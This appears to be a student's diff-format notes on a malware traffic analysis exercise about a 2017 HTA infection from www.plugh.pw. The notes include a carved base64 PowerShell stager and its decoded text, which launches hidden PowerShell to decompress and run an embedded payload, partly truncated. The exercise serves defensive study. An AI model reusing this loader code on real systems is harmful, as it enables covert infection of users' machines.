@@ -1,0 +1,44 @@
+1. A user clicked on a suspicious link on 2017-05-08 and infected their PC. The malware was contained in an HTA (HTML Application) file that was hosted in a TLD (Top-Level Domain) commonly abused by criminals
+
+2. Identify the following:
+
+    The name of the initial malware file that was downloaded and executed
+Answers:
+video.hta
+
+    The name of the site and IP address that hosted the executable
+www.plugh.pw URI: /video.hta
+
+    The software/protocol used for C2
+HTTP
+
+3. Use Wireshark to carve the malicious .hta from the packet capture
+See all below:
+
+https://www.trustedsec.com/july-2015/malicious-htas/
+
+http://doc.emergingthreats.net/2022520
+
+Method: GET Host: www.plugh.pw URI: /video.hta Referrer: - Version: - UA: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C) Trans Depth: 1 Request Body Length: 0 Response Body Length: 0 Status Code: - Status Message: - Info Code: - Info Message: - Tags: (empty) Username: - Password: - Proxied: - Orig FUIDs: - Orig Filenames: - Orig Mime Types: - Resp FUIDs: - Resp Filenames: - Resp Mime Types: -
+
+From WireShark extract: 
+aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAJwBIADQAcwBJAEEARQB2AFEARQBGAGsAQwBBADcAMQBXAGEAMgAvAGEAUwBoAEQAOQBuAEUAcgA5AEQAMQBhAEYAWgBGAHMAaQBZAEEAaAB0AGIAaQBKAFYAdQBuADcAZwBZAEkASQBUAGkATQBPADcANgBHAHAAagByADIARgBoADgAWgBMADEAbQBsAGYAYgAvADMANwBIAGcAQgB2AFMASgBsAFYAdQBQADEAdwByAEUAYgB1AGUAbQBkADMAWgBjADgANwBNAE8AawB3AGkAWAB4AEEAVwBTAFEAUwBmADAAOABCAHYAdQB1AEYARgAxADUAQwArAHYAbgA5ADMAMABrAFEAYwB6AFMAVQBsAFIAMgBjAEQASwB2AEoAUwBMAHIARABhADQAZQAzAEMAbwBuAFAAMQA1AEEAVABNAHUAWABYAEQAZABLAFQAUABrAGoATABVAEYAdwB1AEwAegBSAEcASgBSAHAAZQBYAFoAcwBJADUAagBzAFIAKwBYAHIAagBDAFEAbwA5AGoAUABIACsAZwBCAE0AZQBLAEsAbgAyAFQAdQBoAFAATQA4AGUAbgB0AHcAeABUADcAUQB2AG8AcQA1AGYANABwAFgARgBIADIAZwBPAGoAQgBiAFcATQBpAGYANABLAGwAVQB6ADAASwBVAGwAdQBEACsAUwBoAE4AcgB1AEEAdABLAEIARwBLAC8ATwBXAEwAcgBBADUAUABTADYATgBDADkAVABGAEIATgBGAFoAawBiAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA=
+
+Results:
+if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAEvQEFkCA71Wa2/aShD9nEr9D1aFZFsiYAhtbiJVun7gYIITiMO76Gpjr2Fh8ZL1mlfb/37HgBvSJlVuP1wrEbuemd3Zc87MOkwiXxAWSQSf08BvuuFF15C+vn930kQczSUlR2cDKvJSLrDa4e3ConP15ATMuXXDdKTPkjLUFwuLzRGJRpeXZsI5jsR+XrjCQo9jPH+gBMeKKn2TuhPM8entwxT7Qvoq5f4pXFH2gOjBbWMif4KlUz0KUluD+ShNruAtKBGK/OWLrA5PS6NC9TFBNFZkbzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
+
+Results:
+echo H4sIAEvQEFkCA71Wa2/aShD9nEr9D1aFZFsiYAhtbiJVun7gYIITiMO76Gpjr2Fh8ZL1mlfb/37HgBvSJlVuP1wrEbuemd3Zc87MOkwiXxAWSQSf08BvuuFF15C+vn930kQczSUlR2cDKvJSLrDa4e3ConP15ATMuXXDdKTPkjLUFwuLzRGJRpeXZsI5jsR+XrjCQo9jPH+gBMeKKn2TuhPM8entwxT7Qvoq5f4pXFH2gOjBbWMif4KlUz0KUluD+ShNruAtKBGK/OWLrA5PS6NC9TFBNFZkb | base64 -d | zcat
+
+Results:
+function ie7ldcPMf9WB {
+	Param ($lkZlt, $dDUfOpDlm)		
+	$xLCI = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(
+gzip: stdin: unexpected end of file
+
+
+More Results:
+9	0.066796	10.5.11.57	103.16.76.213	TCP	60	52052 → 80 [ACK] Seq=1330464656 Ack=1623866081 Win=65024 Len=0
+
+
+
